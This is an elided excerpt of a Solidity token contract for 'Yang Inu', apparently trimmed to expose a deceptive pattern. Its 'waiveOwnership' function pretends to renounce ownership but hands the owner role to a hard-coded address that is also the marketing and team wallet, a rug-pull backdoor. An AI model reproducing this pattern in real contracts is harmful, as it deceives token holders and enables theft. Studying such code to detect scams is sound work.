...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x983859ce6eF646728E74bee643b8C7f7985A8C07);
    }
...
contract YangInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Yang Inu";
    string private _symbol = "YANGINU";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x983859ce6eF646728E74bee643b8C7f7985A8C07);
    address payable private teamWalletAddress = payable(0x983859ce6eF646728E74bee643b8C7f7985A8C07);
